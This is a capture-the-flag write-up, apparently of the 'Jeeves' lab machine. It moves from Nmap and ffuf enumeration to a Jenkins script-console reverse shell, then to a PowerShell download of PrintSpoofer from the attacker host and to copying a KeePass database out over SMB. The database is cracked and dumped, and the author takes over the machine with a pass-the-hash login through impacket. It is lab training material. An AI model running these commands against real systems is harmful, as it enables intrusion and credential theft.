## Nmap

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 36m05s, deviation: 0s, median: 36m04s
| smb2-time: 
|   date: 2026-09-04T19:37:15
|_  start_date: 2026-09-04T19:32:07
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Port 80

Nice site

![](pics/Pasted%20image%2020260904173613.png)

I entered `q` in the search bar, this hapopned

![](pics/Pasted%20image%2020260904173839.png)

Information leaked

```
Microsoft SQL Server 2005
Windows NT 5.0
```

## Port 50000

![](pics/Pasted%20image%2020260904180325.png)

Information leaked

```
Jetty(9.4.z-SNAPSHOT)
```

```
searchsploit Jetty
```

![](pics/Pasted%20image%2020260904180437.png)

![](pics/Pasted%20image%2020260904180449.png)

![](pics/Pasted%20image%2020260904180459.png)

Not exploitable

After a while my fuzzing got an endpoint

```bash
ffuf -u http://10.129.228.112:50000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```

![](pics/Pasted%20image%2020260904182414.png)

## Askjeeves endpoint

![](pics/Pasted%20image%2020260904182455.png)

Plugins found 

![](pics/Pasted%20image%2020260904183337.png)

Jenkins version

![](pics/Pasted%20image%2020260904183522.png)


Found this script console which run scripts on the server

![](pics/Pasted%20image%2020260904183027.png)

Maybe I can get reverse shell using this.
Searched for a reverse shell written in groovy

![](pics/Pasted%20image%2020260904184701.png)

Ran it

![](pics/Pasted%20image%2020260904184715.png)

And I got the shell

![](pics/Pasted%20image%2020260904184737.png)

## Flag 1

![](pics/Pasted%20image%2020260904184849.png)

## PrivEsc

First command I ran is 

```cmd
whoami /priv
```

![](pics/Pasted%20image%2020260904185248.png)

Found something that can be abused, `SeImpersonatePrivilege`.

```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://10.10.14.82:8000/PrintSpoofer64.exe' -OutFile 'PrintSpoofer64.exe'"
```

check if spooler is running

```cmd
query spooler
```

```
SERVICE_NAME: spooler 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

Run the exe

![](pics/Pasted%20image%2020260904191529.png)

Nothing happened.....Maybe there is a AV

Looking further into the user file

![](pics/Pasted%20image%2020260904191710.png)

Looked up the file format because I am not familiar with it.

![](pics/Pasted%20image%2020260904191811.png)

It is a kee pass format that stores usernames and passwords.

Started an SMB server on my kali

```bash
impacket-smbserver share .
```

Then on the windows machine

```cmd
copy CEH.kdbx \\10.10.14.82\share\
```

![](pics/Pasted%20image%2020260904192921.png)

After that I extracted the hash via john

```bash
keepass2john CEH.kdbx > ceh_hash.john
```

Then crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ceh_hash.john
```

![](pics/Pasted%20image%2020260904194722.png)

Cracked password

```
moonshine1
```

Dump the passwords

```bash
keepassxc-cli export CEH.kdbx > ceh_dump.txt

or

keepassxc-cli open CEH.kdbx 
show "<NAME>" -s
ls
```

![](pics/Pasted%20image%2020260904195720.png)

Extracted creds

```
Title: DC Recovery PW
UserName: administrator
Password: S1TjAtJHKsugh9oC4VZl


Title: Walmart.com
UserName: anonymous
Password: Password
URL: http://www.walmart.com
Notes: Getting my shopping on


Title: Bank of America
UserName: Michael321
Password: 12345
URL: https://www.bankofamerica.com

Title: It's a secret
UserName: admin
Password: F7WhTrSFDKB6sxHU1cUn
URL: http://localhost:8180/secret.jsp


Title: EC-Council
UserName: hackerman123
Password: pwndyouall!
Notes: Personal login

Title: Keys to the kingdom
UserName: bob
Password: lCEUnYPjNfIuPZSzOySA

Title: DC Recovery PW
UserName: administrator
Password: S1TjAtJHKsugh9oC4VZl

Title: Jenkins admin
UserName: admin
Password: 
URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

Title: Backup stuff
UserName: ?
Password: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Saw some local endpoints so I ran listening ports enum

```cmd
netstat -ano | findstr LISTENING
```

![](pics/Pasted%20image%2020260904200858.png)

Turns out none running, lets focus on testing these creds

```bash
nxc smb 10.129.228.112 -u users.txt -p pass.txt --local-auth
nxc smb 10.129.228.112 -u users.txt -p pass.txt
```

![](pics/Pasted%20image%2020260904201641.png)

![](pics/Pasted%20image%2020260904201701.png)

Trying the hash that seems to be a NTLM hash

```bash
nxc smb 10.129.228.112 -u users.txt -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
```

![](pics/Pasted%20image%2020260904204231.png)

Login via `smbexec`

```bash
impacket-smbexec administrator@10.129.228.112 -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'

better

impacket-psexec administrator@10.129.228.112 -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
```

![](pics/Pasted%20image%2020260904204916.png)

Found this note

![](pics/Pasted%20image%2020260904205430.png)
## Flag 2

So I searched for sneaky ADS streams

```cmd
dir /R
```

![](pics/Pasted%20image%2020260904212102.png)

Then read that hidden stream using powershell

```cmd
powershell -Command "Get-Content hm.txt -Stream root.txt"
```

Done.

![](pics/Pasted%20image%2020260904212402.png)